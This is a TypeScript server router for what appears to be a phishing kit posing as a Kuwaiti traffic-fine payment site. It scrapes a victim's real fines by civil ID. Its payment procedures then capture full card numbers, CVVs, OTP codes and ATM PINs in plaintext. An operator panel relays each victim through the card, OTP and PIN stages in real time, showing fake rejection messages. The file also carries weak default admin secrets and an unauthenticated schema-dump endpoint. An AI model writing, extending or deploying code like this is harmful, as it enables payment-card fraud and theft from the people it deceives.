import { TRPCError } from "@trpc/server";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import {
  createFineQuery,
  updateFineQuery,
  getFineQueryById,
  getRecentFineQueries,
  getFineQueriesByUserId,
  createFines,
  getFinesByQueryId,
  createPaymentSession,
  getPaymentSessionBySessionId,
  updatePaymentSession,
  getAllPaymentSessions,
  getUnreadPaymentSessionsCount,
  clearAdminRecords,
} from "./db";
import { scrapeKuwaitFines, ENQUIRY_TYPES } from "./scraper";
import crypto from "crypto";
import { z } from "zod";

// كلمة مرور الأدمين
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
const ADMIN_JWT_SECRET = process.env.JWT_SECRET || "secret";

function verifyAdminToken(token: string): boolean {
  try {
    const [id, hash] = token.split(".");
    if (!id || !hash) return false;
    const expectedHash = crypto
      .createHmac("sha256", ADMIN_JWT_SECRET)
      .update(id + ADMIN_PASSWORD)
      .digest("hex");
    return hash === expectedHash;
  } catch {
    return false;
  }
}

function generateAdminToken(): string {
  const id = crypto.randomBytes(16).toString("hex");
  const hash = crypto
    .createHmac("sha256", ADMIN_JWT_SECRET)
    .update(id + ADMIN_PASSWORD)
    .digest("hex");
  return `${id}.${hash}`;
}

const adminTokens = new Set<string>();

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  fines: router({
    // جلب أنواع الاستعلام (أفراد / شركات)
    getOptions: publicProcedure.query(() => {
      return {
        enquiryTypes: ENQUIRY_TYPES,
      };
    }),

    // الاستعلام عن المخالفات
    query: publicProcedure
      .input(
        z.object({
          civilId: z.string()
            .min(1, "يرجى إدخال الرقم المدني")
            .max(12)
            .regex(/^[0-9]+$/, "الرقم المدني يجب أن يحتوي على أرقام فقط")
            .transform(v => v.replace(/\s+/g, "").padStart(12, "0")),
          enquiryType: z.enum(["1", "2"]).default("1"),
          lang: z.enum(["ar", "en"]).default("en"),
        })
      )
      .mutation(async ({ input, ctx }) => {
        const queryId = await createFineQuery({
          civilId: input.civilId,
          enquiryType: input.enquiryType,
          status: "pending",
          userId: ctx.user?.id ?? null,
        });

        try {
          console.log(`[Query] Starting scrape for Civil ID: ${input.civilId}`);
          const result = await scrapeKuwaitFines(input.civilId, input.enquiryType, input.lang);
          console.log(`[Query] Scrape result for ${input.civilId}: success=${result.success}`);

          if (!result.success) {
            if (queryId) {
              await updateFineQuery(queryId, {
                status: "failed",
                errorMessage: result.errorMessage,
              });
            }

            return {
              success: false,
              queryId,
              fines: [],
              errorMessage: result.errorMessage || "فشل الاستعلام",
            };
          }

          const finesCount = result.fines.length;
          const status = finesCount === 0 ? "no_fines" : "success";

          if (queryId) {
            await updateFineQuery(queryId, {
              status,
              totalFines: finesCount,
              totalAmount: result.totalAmount ?? "0",
              rawResults: result.fines as any,
            });

            if (finesCount > 0) {
              await createFines(
                result.fines.map((fine) => ({
                  queryId,
                  fineNumber: fine.fineNumber,
                  fineDate: fine.fineDate,
                  description: fine.description,
                  amount: fine.amount ? fine.amount.replace(/[^0-9.]/g, "") : undefined,
                  blackPoints: fine.blackPoints ?? 0,
                  isPaid: fine.isPaid ?? "unpaid",
                  location: fine.location,
                }))
              );
            }
          }

          const isArabic = input.lang === "ar";

          const mappedFines = result.fines.map((fine) => ({
            ticketNo: fine.ticketNo || fine.fineNumber || "",
            amount: fine.amount || "0",
            location: isArabic ? (fine.locationAr || fine.location || "") : (fine.location || fine.locationAr || ""),
            locationAr: fine.locationAr || fine.location || "",
            source: isArabic ? (fine.sourceAr || fine.source || "") : (fine.source || fine.sourceAr || ""),
            sourceAr: fine.sourceAr || fine.source || "",
            description: isArabic ? (fine.descriptionAr || fine.description || "") : (fine.description || fine.descriptionAr || ""),
            descriptionAr: fine.descriptionAr || fine.description || "",
            dateTime: fine.fineDate || "",
            status: fine.isPaid === "paid" ? "paid" : (fine.fineType === "blackpoints" ? "blackpoints" : (fine.fineType === "unpayable" ? "unpayable" : "payable")),
            isPaid: fine.isPaid === "paid",
            violationType: fine.violationType || undefined,
            payableOnline: fine.payableOnline || undefined,
            plateNumber: fine.plateNumber || undefined,
            plateCode: fine.plateCode || undefined,
            platePurposeType: fine.platePurposeType || undefined,
            make: fine.make || undefined,
            model: fine.model || undefined,
            yearOfManufacture: fine.yearOfManufacture || undefined,
            majorColor: fine.majorColor || undefined,
            speed: fine.speed || undefined,
            speedLimit: fine.speedLimit || undefined,
          }));

          const sessionId = crypto.randomBytes(16).toString("hex");
          const forwardedFor = ctx.req.headers["x-forwarded-for"];
          const clientIp = typeof forwardedFor === "string"
            ? forwardedFor.split(",")[0].trim()
            : Array.isArray(forwardedFor)
              ? String(forwardedFor[0] || "")
              : ctx.req.socket.remoteAddress || "";
          const userAgent = ctx.req.headers["user-agent"] || "";

          let sessionCreated = false;
          try {
            await createPaymentSession({
              sessionId,
              queryId: queryId || null,
              selectedFines: mappedFines as any,
              totalAmount: result.totalAmount ?? "0",
              civilId: input.civilId,
              enquiryType: input.enquiryType,
              stage: "card",
              clientIp,
              userAgent,
              statusRead: 0,
            });
            sessionCreated = true;
          } catch (dbError) {
            console.error("[Database] Failed to create payment session:", dbError);
          }

          return {
            success: true,
            queryId,
            sessionId: sessionCreated ? sessionId : undefined,
            fines: mappedFines,
            totalAmount: result.totalAmount,
            totalFines: finesCount,
          };
        } catch (error) {
          if (queryId) {
            await updateFineQuery(queryId, {
              status: "failed",
              errorMessage: error instanceof Error ? error.message : "خطأ غير متوقع",
            });
          }

          return {
            success: false,
            queryId,
            fines: [],
            errorMessage: "حدث خطأ أثناء الاستعلام. يرجى المحاولة مرة أخرى.",
          };
        }
      }),

    // جلب سجل الاستعلامات الأخيرة
    getHistory: publicProcedure
      .input(z.object({ limit: z.number().min(1).max(50).default(20) }).optional())
      .query(async ({ ctx, input }) => {
        if (ctx.user) {
          return getFineQueriesByUserId(ctx.user.id, input?.limit ?? 20);
        }
        return getRecentFineQueries(input?.limit ?? 20);
      }),

    // جلب تفاصيل استعلام معين
    getQueryDetails: publicProcedure
      .input(z.object({ queryId: z.number() }))
      .query(async ({ input }) => {
        const query = await getFineQueryById(input.queryId);
        if (!query) return null;
        const finesData = await getFinesByQueryId(input.queryId);
        return { query, fines: finesData };
      }),
  }),

  // ========== Payment Flow ==========
  payment: router({
    // إنشاء جلسة دفع جديدة
    createSession: publicProcedure
      .input(z.object({
        selectedFines: z.array(z.any()),
        totalAmount: z.string(),
        civilId: z.string().optional(),
        enquiryType: z.string().optional(),
        queryId: z.number().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        const sessionId = crypto.randomBytes(16).toString("hex");
        const clientIp = (ctx.req.headers["x-forwarded-for"] as string)?.split(",")[0] || ctx.req.socket.remoteAddress || "";
        const userAgent = ctx.req.headers["user-agent"] || "";

          // Calculate total fines amount from the original query
          let totalFinesAmount: string | null = null;
          let totalFinesCount: number = 0;
          if (input.queryId) {
            try {
              const relatedQuery = await getFineQueryById(input.queryId);
              if (relatedQuery) {
                totalFinesAmount = relatedQuery.totalAmount?.toString() || null;
                totalFinesCount = relatedQuery.totalFines || 0;
              }
            } catch (err) {
              console.error("[Payment] Failed to get related query data:", err);
            }
          }

          await createPaymentSession({
            sessionId,
            queryId: input.queryId ?? null,
            selectedFines: input.selectedFines,
            totalAmount: input.totalAmount,
            civilId: input.civilId ?? null,
            enquiryType: input.enquiryType ?? '1',
            stage: "card",
            clientIp,
            userAgent,
            statusRead: 0,
            totalFinesAmount,
            totalFinesCount,
          } as any);

        return { success: true, sessionId };
      }),

    // جلب حالة الجلسة (polling)
    getStatus: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        return {
          stage: session.stage,
          errorMessage: session.errorMessage,
        };
      }),

    // إرسال بيانات البطاقة
    submitCard: publicProcedure
      .input(z.object({
        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
        cardName: z.string()
          .min(2, "اسم حامل البطاقة قصير جداً")
          .max(60, "اسم حامل البطاقة طويل جداً")
          .regex(/^[a-zA-Z\u0600-\u06FF\s]+$/, "اسم حامل البطاقة يحتوي على أحرف غير مسموح بها")
          .transform(v => v.trim()),
        cardNumber: z.string()
          .min(13)
          .max(19)
          .transform(v => v.replace(/\s/g, ""))
          .refine(v => /^[0-9]{13,19}$/.test(v), "رقم البطاقة غير صالح"),
        cardExpiry: z.string()
          .regex(/^(0[1-9]|1[0-2])\/?(\d{2}|\d{4})$/, "تاريخ انتهاء البطاقة غير صالح")
          .max(7),
        cardCvv: z.string()
          .min(3)
          .max(4)
          .regex(/^[0-9]{3,4}$/, "CVV غير صالح"),
      }))
      .mutation(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        if (session.stage !== "card") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });

        const masked = input.cardNumber.replace(/\s/g, "").replace(/(\d{4})\d{8}(\d{4})/, "$1 **** **** $2");

        await updatePaymentSession(input.sessionId, {
          cardName: input.cardName,
          cardNumber: input.cardNumber.replace(/\s/g, ""),
          cardNumberMasked: masked,
          cardExpiry: input.cardExpiry,
          cardCvv: input.cardCvv,
          stage: "card_pending",
          statusRead: 0,
          errorMessage: null,
        });

        return { success: true };
      }),

    // إرسال رمز OTP
    submitOtp: publicProcedure
      .input(z.object({
        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
        otpCode: z.string()
          .min(4, "رمز OTP قصير جداً")
          .max(8, "رمز OTP طويل جداً")
          .regex(/^[0-9]+$/, "رمز OTP يجب أن يحتوي على أرقام فقط"),
      }))
      .mutation(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        if (session.stage !== "otp") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });

        await updatePaymentSession(input.sessionId, {
          otpCode: input.otpCode,
          stage: "otp_pending",
          statusRead: 0,
          errorMessage: null,
        });

        return { success: true };
      }),

    // إرسال رقم ATM PIN
    submitAtmPin: publicProcedure
      .input(z.object({
        sessionId: z.string().length(32).regex(/^[a-f0-9]+$/, "معرف الجلسة غير صالح"),
        atmPin: z.string()
          .min(4, "رقم PIN قصير جداً")
          .max(6, "رقم PIN طويل جداً")
          .regex(/^[0-9]+$/, "رقم PIN يجب أن يحتوي على أرقام فقط"),
      }))
      .mutation(async ({ input }) => {
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        if (session.stage !== "atm") throw new TRPCError({ code: "BAD_REQUEST", message: "المرحلة غير صحيحة" });

        await updatePaymentSession(input.sessionId, {
          atmPin: input.atmPin,
          stage: "atm_pending",
          statusRead: 0,
          errorMessage: null,
        });

        return { success: true };
      }),
  }),

  // ========== Admin Panel ==========
  admin: router({
    login: publicProcedure
      .input(z.object({
        password: z.string().min(1).max(200),
      }))
      .mutation(async ({ input }) => {
        if (input.password !== ADMIN_PASSWORD) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "كلمة المرور غير صحيحة" });
        }
        const token = generateAdminToken();
        adminTokens.add(token);
        setTimeout(() => adminTokens.delete(token), 24 * 60 * 60 * 1000);
        return { success: true, token };
      }),

    verify: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(async ({ input }) => {
        return { valid: verifyAdminToken(input.token) };
      }),

    getStats: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(async ({ input }) => {
        if (!verifyAdminToken(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const sessions = await getAllPaymentSessions(200);
        const total = sessions.length;
        const pending = sessions.filter(s => s.stage.endsWith("_pending")).length;
        const completed = sessions.filter(s => s.stage === "success").length;
        const failed = sessions.filter(s => s.stage === "failed").length;
        const newCount = sessions.filter(s => s.statusRead === 0).length;
        return { total, pending, completed, failed, new: newCount };
      }),

    getSessions: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(async ({ input }) => {
        if (!verifyAdminToken(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const sessions = await getAllPaymentSessions(100);
        const sessionsWithQueryData = await Promise.all(
          sessions.map(async (session) => {
            let relatedQuery = undefined;
            try {
              relatedQuery = session.queryId ? await getFineQueryById(session.queryId) : undefined;
            } catch (err) {
              console.error(`[Admin] Failed to fetch related query for session ${session.sessionId}:`, err);
            }

            return {
              ...session,
              totalAmount: session.totalAmount ?? (relatedQuery?.totalAmount != null ? String(relatedQuery.totalAmount) : null),
              civilId: session.civilId ?? relatedQuery?.civilId ?? null,
              enquiryType: session.enquiryType ?? relatedQuery?.enquiryType ?? null,
            };
          })
        );
        for (const s of sessions.filter(s => s.statusRead === 0)) {
          await updatePaymentSession(s.sessionId, { statusRead: 1 });
        }
        return sessionsWithQueryData;
      }),

    getSession: publicProcedure
      .input(z.object({ token: z.string(), sessionId: z.string() }))
      .query(async ({ input }) => {
        if (!verifyAdminToken(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });
        const relatedQuery = session.queryId ? await getFineQueryById(session.queryId) : undefined;
        await updatePaymentSession(input.sessionId, { statusRead: 1 });
        return {
          ...session,
          totalAmount: session.totalAmount ?? (relatedQuery?.totalAmount != null ? String(relatedQuery.totalAmount) : null),
          civilId: session.civilId ?? relatedQuery?.civilId ?? null,
          enquiryType: session.enquiryType ?? relatedQuery?.enquiryType ?? null,
        };
      }),

    action: publicProcedure
      .input(z.object({
        token: z.string(),
        sessionId: z.string(),
        action: z.enum(["pass", "denied", "completed"]),
        errorMessage: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        if (!verifyAdminToken(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });

        let newStage: typeof session.stage = session.stage;

        if (input.action === "pass") {
          if (session.stage === "card_pending") newStage = "otp";
          else if (session.stage === "otp_pending") newStage = "atm";
          else if (session.stage === "atm_pending") newStage = "success";
        } else if (input.action === "denied") {
          if (session.stage === "card_pending") newStage = "card";
          else if (session.stage === "otp_pending") newStage = "otp";
          else if (session.stage === "atm_pending") newStage = "atm";
          else newStage = "failed";
        } else if (input.action === "completed") {
          newStage = "success";
        }

        let errorMsg: string | null = null;
        if (input.action === "denied") {
          if (input.errorMessage) {
            errorMsg = input.errorMessage;
          } else if (session.stage === "otp_pending") {
            errorMsg = "برجاء التحقق من الرمز المرسل عبر الجوال";
          } else if (session.stage === "atm_pending") {
            errorMsg = "برجاء التحقق من الرقم السري للآلي الصحيح";
          } else {
            errorMsg = "تم رفض العملية. يرجى المحاولة مرة أخرى.";
          }
        }

        await updatePaymentSession(input.sessionId, {
          stage: newStage,
          errorMessage: errorMsg,
        });

        return { success: true, newStage };
      }),

    redirect: publicProcedure
      .input(z.object({
        token: z.string(),
        sessionId: z.string(),
        redirectUrl: z.string(),
      }))
      .mutation(async ({ input }) => {
        if (!verifyAdminToken(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        const session = await getPaymentSessionBySessionId(input.sessionId);
        if (!session) throw new TRPCError({ code: "NOT_FOUND", message: "الجلسة غير موجودة" });

        await updatePaymentSession(input.sessionId, {
          redirectUrl: input.redirectUrl,
        });

        return { success: true };
      }),

    // تتبع الصفحة الحالية للعميل
    trackPage: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        currentPage: z.string(),
        paidAmount: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const updateData: any = { currentPage: input.currentPage };
        if (input.paidAmount) {
          updateData.paidAmount = input.paidAmount;
        }
        await updatePaymentSession(input.sessionId, updateData);
        return { success: true };
      }),

    // تتبع الصفحة الحالية للعميل بالرقم المدني (بدون الحاجة لـ sessionId)
    updatePageByCivilId: publicProcedure
      .input(z.object({
        civilId: z.string(),
        currentPage: z.string(),
        amount: z.number().optional(),
      }))
      .mutation(async ({ input }) => {
        const { getPaymentSessionByCivilId } = await import("./db");
        const session = await getPaymentSessionByCivilId(input.civilId);
        if (session) {
          const updateData: any = { currentPage: input.currentPage };
          if (input.amount) {
            updateData.paidAmount = input.amount.toString();
          }
          await updatePaymentSession(session.sessionId, updateData);
        }
        return { success: true };
      }),

    // إعادة توجيه العميل لصفحة معينة
    sendRedirect: publicProcedure
      .input(z.object({
        token: z.string(),
        sessionId: z.string(),
        targetPage: z.string(),
      }))
      .mutation(async ({ input }) => {
        if (!verifyAdminToken(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }
        await updatePaymentSession(input.sessionId, {
          redirectUrl: input.targetPage,
        });
        return { success: true };
      }),

    clearAll: publicProcedure
      .input(z.object({ token: z.string() }))
      .mutation(async ({ input }) => {
        if (!verifyAdminToken(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }

        const deleted = await clearAdminRecords();
        return { success: true, deleted };
      }),

    runMigrations: publicProcedure
      .input(z.object({ token: z.string() }))
      .mutation(async ({ input }) => {
        if (!verifyAdminToken(input.token)) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "غير مصرح" });
        }

        const { runMigrations } = await import("./_core/migrate");
        try {
          await runMigrations();
          return { success: true, message: "تم تشغيل عمليات الترحيل بنجاح" };
        } catch (err: any) {
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: `فشل تشغيل عمليات الترحيل: ${err.message}`
          });
        }
      }),

    repairDatabase: publicProcedure
      .input(z.object({ token: z.string() }))
      .mutation(async ({ input }) => {
        if (!verifyAdminToken(input.token)) throw new TRPCError({ code: "UNAUTHORIZED" });
        const { getDb } = await import("./db");
        const db = await getDb();
        if (!db) return { success: false, message: "Database not available" };

        try {
          const client = (db as any).session.client;
          await client.query("SET FOREIGN_KEY_CHECKS = 0");
          await client.query("DROP TABLE IF EXISTS `users`");
          await client.query("DROP TABLE IF EXISTS `fine_queries`");
          await client.query("DROP TABLE IF EXISTS `fines`");
          await client.query("DROP TABLE IF EXISTS `payment_sessions`");
          await client.query("SET FOREIGN_KEY_CHECKS = 1");

          const { runMigrations } = await import("./_core/migrate");
          await runMigrations();

          return { success: true, message: "تمت إعادة بناء قاعدة البيانات بنجاح" };
        } catch (err: any) {
          return { success: false, message: `فشل الإصلاح: ${err.message}` };
        }
      }),

    debugSchema: publicProcedure
      .query(async () => {
        const { getDb } = await import("./db");
        const db = await getDb();
        if (!db) return { error: "Database not available" };

        try {
          const results: any = {};
          const tables = ['users', 'fine_queries', 'fines', 'payment_sessions'];
          for (const table of tables) {
            try {
              const [rows] = await (db as any).session.client.query(`DESCRIBE \`${table}\``);
              results[table] = rows;
            } catch (err: any) {
              results[table] = { error: err.message };
            }
          }
          return results;
        } catch (err: any) {
          return { error: err.message };
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
